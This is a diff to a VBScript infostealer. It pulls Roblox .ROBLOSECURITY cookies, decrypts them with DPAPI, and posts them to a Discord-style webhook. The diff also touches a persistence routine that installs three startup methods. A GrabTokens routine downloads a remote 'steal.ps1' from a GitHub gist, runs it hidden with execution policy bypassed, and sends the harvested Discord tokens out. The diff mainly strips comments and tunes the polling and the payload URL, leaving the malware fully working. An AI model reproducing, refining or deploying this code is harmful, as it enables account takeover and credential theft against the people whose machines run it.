@@ -101,7 +101,6 @@ Sub PostCookieOnly(targetWH)
     Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
 End Sub
 
-' --- GetRobloxCookie: now handles plaintext, JSON, GDK, legacy ---
 Function GetRobloxCookie()
     GetRobloxCookie = ""
     Dim paths(4)
@@ -133,8 +132,6 @@ Function GetRobloxCookie()
     If Len(raw) < 20 Then Exit Function
 
     Dim cookie: cookie = ""
-
-    ' JSON CookiesData base64 -> DPAPI
     Dim sp: sp = InStr(raw, "CookiesData"":""")
     If sp > 0 Then
         sp = sp + 14
@@ -144,8 +141,6 @@ Function GetRobloxCookie()
             If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
         End If
     End If
-
-    ' plaintext .ROBLOSECURITY
     If Len(cookie) < 20 And InStr(raw, ".ROBLOSECURITY") > 0 Then
         Dim rp: rp = InStr(raw, ".ROBLOSECURITY") + 15
         Dim seg: seg = Mid(raw, rp, 2000)
@@ -154,8 +149,6 @@ Function GetRobloxCookie()
         If sc1 > 0 Then seg = Left(seg, sc1 - 1)
         cookie = Trim(seg)
     End If
-
-    ' plaintext _|WARNING
     If Len(cookie) < 20 And InStr(raw, "_|WARNING") > 0 Then
         Dim wp: wp = InStr(raw, "_|WARNING")
         Dim seg2: seg2 = Mid(raw, wp, 2000)
@@ -164,18 +157,14 @@ Function GetRobloxCookie()
         If sc2 > 0 Then seg2 = Left(seg2, sc2 - 1)
         cookie = Trim(seg2)
     End If
-
-    ' plaintext raw cookie — line/file that looks like a standalone token
     If Len(cookie) < 20 Then
         Dim cleaned: cleaned = raw
         cleaned = Replace(cleaned, vbCr, "") : cleaned = Replace(cleaned, vbLf, "") : cleaned = Replace(cleaned, vbTab, "")
         cleaned = Trim(cleaned)
-        ' strip any leading key=
         Dim eqp: eqp = InStr(cleaned, "=")
         If eqp > 0 And eqp < 40 Then cleaned = Mid(cleaned, eqp + 1)
         If Len(cleaned) >= 40 Then cookie = cleaned
     End If
-
     cookie = Trim(cookie)
     GetRobloxCookie = cookie
 End Function
@@ -197,11 +186,11 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
 End Sub
 
-' --- GrabTokens: wait for stable file, copy-then-read ---
+' --- GrabTokens: polls for DONE sentinel, copy-then-read, BOM strip ---
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/85339b28a27995d2a49972a8db2789d4df7f745b/steal.ps1", False
+    xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/1a19a4f15511de7eec09722f94d6a6d254491b65/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
@@ -212,38 +201,37 @@ Sub GrabTokens(targetWH)
     WriteFile psf, pc
 
     Dim tf: tf = TmpFile("steal_result.txt")
-    fso.DeleteFile tf, True   ' clear stale so we can wait for fresh
+    fso.DeleteFile tf, True
 
-    Dim runCmd: runCmd = "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """"
-    sh.Run runCmd, 0, False
+    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
 
-    ' poll: wait for file to exist AND stop growing AND not be locked
+    ' poll for DONE sentinel, size-stable, 120s ceiling
     Dim waited: waited = 0
     Dim lastSize: lastSize = -1
     Dim stable: stable = 0
+    Dim done: done = False
     Do
-        SleepSeconds 1
-        waited = waited + 1
+        Call SleepSeconds(2)
+        waited = waited + 2
         If fso.FileExists(tf) Then
             Dim sz: sz = 0
             On Error Resume Next
             sz = fso.GetFile(tf).Size
             On Error GoTo 0
-            If sz = lastSize And sz > 0 Then
-                stable = stable + 1
-            Else
-                stable = 0
-            End If
+            If sz = lastSize And sz > 0 Then stable = stable + 1 Else stable = 0
             lastSize = sz
+            If stable >= 2 Then
+                Dim peek: peek = ReadFile(tf)
+                If InStr(peek, "DONE") > 0 Then done = True
+            End If
         End If
-        If stable >= 2 Then Exit Do
-        If waited >= 60 Then Exit Do
+        If done Then Exit Do
+        If waited >= 120 Then Exit Do
     Loop
 
     If Not fso.FileExists(tf) Then Exit Sub
 
-    ' copy-then-read so a live handle doesn't kill us
-    Dim cp: cp = TmpFile("sr_" & Int(Rnd()*100000) & ".txt")
+    Dim cp: cp = TmpFile("sr_" & Int(Rnd()*99999) & ".txt")
     On Error Resume Next
     fso.CopyFile tf, cp, True
     On Error GoTo 0
@@ -253,14 +241,16 @@ Sub GrabTokens(targetWH)
     If cp <> tf Then fso.DeleteFile cp, True
     If Len(raw) < 10 Then Exit Sub
 
+    If Asc(Left(raw, 1)) = 239 Then raw = Mid(raw, 4)
+
     raw = Replace(raw, vbCrLf, vbLf)
     raw = Replace(raw, vbCr, vbLf)
+
     Dim lines: lines = Split(raw, vbLf)
     Dim l
     For Each l In lines
         l = Trim(l)
         If Len(l) = 0 Then
-            ' skip
         ElseIf Left(l, 8) = "DISCORD|" Then
             Dim p: p = Split(Mid(l, 9), "|")
             If UBound(p) >= 4 Then
@@ -283,6 +273,7 @@ End Sub
 
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
+
 Function ReadFile(path)
     ReadFile = ""
     On Error Resume Next
